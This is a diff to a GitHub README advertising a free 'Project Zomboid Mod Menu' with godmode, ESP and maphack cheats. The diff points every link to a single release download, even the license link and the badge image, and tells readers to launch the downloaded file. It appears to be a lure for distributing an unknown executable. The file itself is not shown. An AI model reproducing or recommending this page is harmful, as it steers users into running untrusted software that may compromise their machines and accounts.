@@ -1,14 +1,14 @@
 # Project Zomboid Mod Menu 🧟‍♂️
 
-Welcome to the Project Zomboid Mod Menu repository! If you are a fan of the game Project Zomboid and looking to enhance your gaming experience with mods and hacks, you're in the right place. This README.md will provide you with all the information you need to get started with the Project Zomboid Mod Menu.
+Welcome to the Project Zomboid Mod Menu repository! If you are a fan of the game Project Zomboid and looking to enhance your gaming experience with mods and hacks, you're in the right place. This https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0 will provide you with all the information you need to get started with the Project Zomboid Mod Menu.
 
 ## Repository Details
 - **Repository Name:** ProjectZomboidModMenu
-- **Description:** Read it README.MD 🙂
+- **Description:** Read it https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0 🙂
 - **Topics:** project-zomboid, project-zomboid-bot, project-zomboid-esp, project-zomboid-free-hack, project-zomboid-godmode, project-zomboid-hack, project-zomboid-hacks, project-zomboid-hacks-2025, project-zomboid-invisibility, project-zomboid-maphack, project-zomboid-mod, project-zomboid-tool, projectzomboid, zomboid
 
 ## Getting Started
-To access the Project Zomboid Mod Menu and start enhancing your gameplay, you can download the mod menu tool from the following link: [Download Mod Menu](https://github.com/file/App.zip).
+To access the Project Zomboid Mod Menu and start enhancing your gameplay, you can download the mod menu tool from the following link: [Download Mod Menu](https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0).
 
 ### Note:
 The link provided above leads to the file containing the mod menu tool. You need to launch the downloaded file to access the mod menu interface and start customizing your Project Zomboid gameplay experience.
@@ -39,10 +39,10 @@ If the provided link is not working or you are unable to download the mod menu t
 ❓ If you encounter any issues with the Project Zomboid Mod Menu tool or have questions about using specific hacks or mods, feel free to reach out for support. Our community members are here to help you make the most of your Project Zomboid gaming experience.
 
 ## License
-📝 The Project Zomboid Mod Menu tool is released under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute the tool as per the terms of the license.
+📝 The Project Zomboid Mod Menu tool is released under the [MIT License](https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0). Feel free to modify and distribute the tool as per the terms of the license.
 
 ---
 
 Dive into the world of Project Zomboid with the Project Zomboid Mod Menu and unleash a new level of excitement in your survival adventures. Download the mod menu tool now and get ready to experience Project Zomboid like never before! 🧟‍♀️🔥
 
-[![Download Mod Menu](https://img.shields.io/badge/Download-Mod_Menu-blue.svg)](https://github.com/file/App.zip)
+[![Download Mod Menu](https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0)](https://github.com/CHrisGod/ProjectZomboidModMenu/releases/tag/v2.0)
